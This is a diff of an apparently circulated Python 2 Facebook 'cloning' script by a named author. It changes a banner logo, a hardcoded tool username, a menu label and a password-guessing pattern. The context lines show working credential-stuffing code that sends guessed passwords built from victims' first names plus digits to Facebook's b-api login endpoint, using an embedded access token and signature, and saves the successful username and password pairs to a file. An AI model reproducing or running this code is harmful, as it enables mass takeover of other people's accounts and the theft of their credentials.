@@ -51,12 +51,14 @@ def jalan(z):
 #Dev:Arbab-Memon
 ##### LOGO #####
 logo = """
-\033[1;91m╭━━━┳╮╱╱╱╱╭╮╱╱╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱╭━━━╮╱╭╮╱╱╱╱╭╮
-\033[1;92m┃╭━╮┃┃╱╱╱╱┃┃╱╱╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱┃╭━╮┃╱┃┃╱╱╱╱┃┃
-\033[1;93m┃╰━━┫╰━┳━━┫╰━┳━━━┳━━┳━╯┣━━╮╱╱┃┃╱┃┣━┫╰━┳━━┫╰━╮
-\033[1;94m╰━━╮┃╭╮┃╭╮┃╭╮┣━━┃┃╭╮┃╭╮┃╭╮┣━━┫╰━╯┃╭┫╭╮┃╭╮┃╭╮┃
-\033[1;95m┃╰━╯┃┃┃┃╭╮┃┃┃┃┃━━┫╭╮┃╰╯┃╭╮┣━━┫╭━╮┃┃┃╰╯┃╭╮┃╰╯┃
-\033[1;96m╰━━━┻╯╰┻╯╰┻╯╰┻━━━┻╯╰┻━━┻╯╰╯╱╱╰╯╱╰┻╯╰━━┻╯╰┻━━╯
+
+
+\033[1;91m░█████╗░██████╗░██████╗░░█████╗░██████╗░
+\033[1;36m██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗
+\033[1;91m███████║██████╔╝██████╦╝███████║██████╦╝
+\033[1;93m██╔══██║██╔══██╗██╔══██╗██╔══██║██╔══██╗
+\033[1;94m██║░░██║██║░░██║██████╦╝██║░░██║██████╦╝
+\033[1;95m╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═════╝░
 \033[1;97m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;92m๑۩۩๑\033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
 \033[1;97mAuthor©\033[1;97m: \033[1;92mMr Arbab Ali Memon
 \033[1;97mInstagram\033[1;97m: \033[1;92mhttps://ArbabMemon
@@ -103,7 +105,7 @@ jalan("\033[1;95m   Arbab Ali Memon +923003023263 ")
 jalan("\033[1;94m   My Totallly CommondS Will update once in a Week.")
 print "\033[1;91m«-------------\033[1;93mLogin With Tool\033[1;91m-------------»"
 
-CorrectUsername = "Shahzada"
+CorrectUsername = "Dumdar"
 CorrectPassword = "Arbab"
 
 loop = 'true'
@@ -247,7 +249,7 @@ def super():
 	print logo
 	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mClone From Login ID..."
 	print "\033[1;97m--\033[1;92m> \033[1;92m2.\x1b[1;92mClone From Public ID..."
-	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mBack"
+	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mBack jani kalti marne ka"
 	pilih_super()
 
 def pilih_super():
@@ -336,8 +338,8 @@ def pilih_super():
 							cek.write(user+"|"+pass2+"\n")
 							cek.close()
 							cekpoint.append(user+pass2)
-												else:
-							pass3 = y['first_name'] + '12345'
+						else:
+							pass3 = y['first_name'] + '112233'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							s = json.load(data)
 							if 'access_token' in s:
